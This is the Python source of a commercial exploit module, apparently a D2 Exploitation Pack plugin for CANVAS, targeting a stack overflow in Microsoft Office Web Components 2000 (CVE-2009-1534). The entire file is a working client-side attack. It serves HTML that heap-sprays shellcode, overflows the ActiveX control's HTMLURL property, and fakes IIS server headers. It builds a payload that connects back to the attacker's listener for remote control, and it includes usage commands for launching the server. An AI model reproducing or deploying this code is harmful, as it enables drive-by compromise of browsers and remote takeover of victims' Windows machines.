#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct
import random


# GUI info
NAME = "Microsoft Office Web Components 2000 Buffer Overflow Vulnerability"

DESCRIPTION = "Stack Overflow Vulnerability in Microsoft Office Web Components 2000"
DOCUMENTATION = {}
DOCUMENTATION['Date public'] = "2009.08.11"
DOCUMENTATION['References'] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=819"
DOCUMENTATION['VersionsAffected'] = "Microsoft Office Web Components 2000"
DOCUMENTATION["CVE Name"] = "CVE-2009-1534"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1534"

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_ms09_043 -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
  def __init__(self):
    tcpexploit.__init__(self)
    httpclientside.__init__(self)
    self.clientversion = 1
    self.badstring = "\x00"
    self.subesp = 0
    self.name = NAME 
    self.filename = "index.html"
    self.filename2 = "menu.html"
    self.filename3 = "page_" + str(random.randint(1, 99)) + ".html"    
    self.done = 0         
    
    return
        
        
  def makefile(self):	
    host = self.callback.ip
    port = self.callback.port
    
    filedata = """
<HTML>  
<BODY>

<SCRIPT language="javascript">  

try {		
var stackBuffer = "";
var heapSprayToAddress = 0x0c0c0c0c; 
var payLoadCode = unescape('SHELLCODE'); 
var heapBlockSize = 0x400000; 
var payLoadSize = payLoadCode.length * 2; 
var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
var spraySlide = unescape("%u0c0c%u0c0c"); 
spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
memory = new Array(); 

for (i=0;i<heapBlocks;i++) { 
	memory[i] = spraySlide + payLoadCode; 
} 

function getSpraySlide(spraySlide, spraySlideSize) {
	while (spraySlide.length*2<spraySlideSize) { 
		spraySlide += spraySlide; 
	} 
	
	spraySlide = spraySlide.substring(0,spraySlideSize/2); 
	return spraySlide; 
} 
}
catch(e) {}

</SCRIPT> 

<IFRAME src="FILENAME"></IFRAME>

</BODY> 
</HTML>                           
"""
    filedata = filedata.replace('SERVERHOST', host)	
    filedata = filedata.replace('FILENAME', self.filename3)
    filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))
  
    if self.useSSL:
      filedata = filedata.replace('http:', 'https:')
  	
    return filedata


  def makefile2(self):	
    host = self.callback.ip
    port = self.callback.port
    
    filedata = """
<HTML>

<BODY> 

<SCRIPT language="javascript">  

history.back();

</SCRIPT> 

</BODY> 
</HTML>        
"""	

    if self.useSSL:
      filedata = filedata.replace('http:', 'https:')
      
    return filedata


  def makefile3(self):	
    host = self.callback.ip
    port = self.callback.port
    
    filedata = """
<HTML>
  <HEAD>    
    <meta http-equiv="refresh" content="5; url=http://SERVERHOST/FILENAME"/>
  </HEAD>

<BODY>
 
<DIV id="targetDiv">
  <OBJECT classid='clsid:0002E512-0000-0000-C000-000000000046' id='target'></OBJECT>
</DIV>

<SCRIPT language="javascript">  

try {		
		var stackBuffer = "";
	
    for (i=0;i<30000;i++) {
			stackBuffer += unescape("%u0c0c"); 
		}
    				
		target.HTMLURL = stackBuffer;	
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>           
"""	
    filedata = filedata.replace('SERVERHOST', host)	
    filedata = filedata.replace('FILENAME', self.filename2)
       
    if self.useSSL:
      filedata = filedata.replace('http:', 'https:')
    
    return filedata


  def makesploit(self, clientheader, clientbody):        
    from libs.spkproxy import header, body
    h = header('SERVER')
    b = body()
    
    if clientheader.URL.count(self.filename):
      self.createShellcode()
      sploitstring = self.makefile() 
      b.setBody(sploitstring)             
        
    elif clientheader.URL.count(self.filename3):
      sploitstring = self.makefile3()                        
      
      if not self.done:
        b.setBody(sploitstring)
        h.status = '200'
        h.msg = 'OK'              
        h.addHeader('Server', 'Microsoft-IIS/5.0')
        h.addHeader('Date', time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()))
        h.addHeader('Content-Type', 'text/html')                                            
        h.addHeader('Accept-Ranges', 'bytes')
        h.addHeader('Last-Modified', 'Wed, 23 Sep 2008 12:10:53 GMT')
        h.addHeader('ETag', '"28e3abe5463cca1:7ec"')     
        self.done = 1
      else:                                                                                   
        h.status = '304'
        h.msg = 'Not Modified'              
        h.addHeader('Server', 'Microsoft-IIS/5.0')
        h.addHeader('Date', time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()))              
        h.addHeader('ETag', '"28e3abe5463cca1:7ec"')     
        self.done = 0          
    
    elif clientheader.URL.count(self.filename2):
      sploitstring = self.makefile2()            
      b.setBody(sploitstring)
    
    else:
      self.log('Redirecting to self')
      h.status = '302'
      h.addHeader('Location', self.filename)
      h.addHeader('Content-Type', 'binary/octet-stream')

    return h, b


  def neededListenerTypes(self):
    from canvasengine import HTTPMOSDEF
    return [HTTPMOSDEF]
    

  def createShellcode(self):
		proxy_payload = ''

		try:
			if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
				import shellcode.standalone.windows.payloads as payloads

				ssl_dict = { True : 'https', False : 'http' }

				p   = payloads.payloads()
				sc  = p.http_proxy("%s://%s" % (ssl_dict[self.useSSL], self.callback.ip), self.callback.port)
				proxy_payload = p.assemble(sc)
				
		except Exception, msg:
		    import traceback
		    traceback.print_exc(file = sys.stderr)
		    proxy_payload = ''
		
		self.shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port, proxy_payload)
		
		return self.shellcode


  def run(self):        
    return 1


if __name__=='__main__':
	print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
